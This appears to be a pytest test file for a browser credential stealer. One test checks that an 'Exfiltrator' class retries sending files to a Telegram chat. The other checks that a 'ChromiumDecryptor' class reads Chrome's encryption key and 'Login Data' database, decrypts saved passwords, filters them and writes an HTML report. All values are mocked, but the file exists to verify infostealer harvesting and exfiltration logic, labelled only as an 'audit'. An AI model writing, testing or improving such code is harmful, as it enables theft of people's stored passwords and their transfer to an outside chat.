import pytest
import requests
from pathlib import Path
from unittest.mock import MagicMock, patch
from main import Exfiltrator, ChromiumDecryptor

def test_retry_request_fails_gracefully(mocker):
    """Test that retry_request returns False and does not raise after max retries."""
    exf = Exfiltrator(telegram_token="fake", telegram_chat_id="fake")
    
    # Mock requests.post to always raise an exception
    mock_post = mocker.patch("requests.post", side_effect=requests.exceptions.ConnectionError("Network Down"))
    
    # Mock open for the file
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"data"))
    
    # This should return False, not raise
    result = exf.send_to_telegram("any_path.html")
    
    assert result is False
    # Verify it tried 3 times (default MAX_RETRIES)
    assert mock_post.call_count == 3

def test_audit_filtering_logic(mocker, tmp_path):
    """Test that audit correctly separates HTTP and non-HTTP credentials."""
    decryptor = ChromiumDecryptor()
    
    # Mock basic filesystem and DB
    mocker.patch("main.OUTPUT_DIR", tmp_path)
    mocker.patch.object(ChromiumDecryptor, "get_key", return_value=b"fake_key")
    mocker.patch.object(ChromiumDecryptor, "decrypt", side_effect=lambda blob, key: blob.decode())
    
    # Mock browser path
    mock_path = tmp_path / "User Data"
    mock_path.mkdir()
    (mock_path / "Local State").write_text('{"os_crypt":{"encrypted_key":"YmFzZTY0Cg=="}}')
    
    # Mock profile and DB
    default_path = mock_path / "Default"
    default_path.mkdir()
    db_path = default_path / "Login Data"
    db_path.write_text("fake db content")
    
    # Mock sqlite3
    mock_conn = MagicMock()
    mock_cursor = mock_conn.cursor.return_value
    # Return 3 rows: 1 valid HTTP, 1 non-HTTP (filtered), 1 partial (skipped)
    mock_cursor.fetchall.return_value = [
        ("https://google.com", "user1", b"pass1"),
        ("ftp://local-files", "user2", b"pass2"), # Should be filtered
        ("https://missing", "", b"pass3"),       # Should be skipped (missing user)
    ]
    mocker.patch("sqlite3.connect", return_value=mock_conn)
    mocker.patch("shutil.copy2")
    
    # Update browsers dict to point to our tmp path
    decryptor.browsers = {"Chrome": mock_path}
    
    count, report_file = decryptor.audit(fmt="html", out="test_audit")
    
    # main count should only be 1 (the HTTP one)
    assert count == 1
    assert report_file is not None
    
    # Check HTML content for filtered section
    report_content = Path(report_file).read_text(encoding='utf-8')
    assert "https://google.com" in report_content
    assert "Entradas Filtradas (No-HTTP/Otros)" in report_content
    assert "ftp://local-files" in report_content
